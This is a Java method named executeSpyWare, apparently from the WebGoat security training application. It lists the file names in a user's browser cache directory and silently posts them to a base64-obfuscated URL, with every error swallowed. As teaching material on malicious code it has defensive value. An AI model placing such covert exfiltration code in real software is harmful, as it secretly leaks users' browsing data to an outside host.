    public void executeSpyWare(WebSession s) {
        String userHome = System.getProperty("user.home") + "\\Local Settings\\Temporary Internet Files";
        String separator = System.getProperty("line.separator");
        File dir = new File(userHome);
        StringBuffer browserFiles = new StringBuffer();
        if (dir.isDirectory()) {
            File[] children = dir.listFiles();
            for (int i = 0; i < children.length; i++) {
                browserFiles.append(children[i].getName());
                browserFiles.append(separator);
            }
        }
        try {
            String partner = new String(new sun.misc.BASE64Decoder().decodeBuffer(WEBGOAT_URL));
            URL url = new URL(partner);
            URLConnection conn = url.openConnection();
            conn.setDoOutput(true);
            OutputStreamWriter wr = new OutputStreamWriter(conn.getOutputStream());
            wr.write("&cache=" + browserFiles.toString());
            wr.flush();
            BufferedReader rd = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            String line;
            while ((line = rd.readLine()) != null) {
            }
            wr.close();
            rd.close();
        } catch (Exception e) {
        }
    }
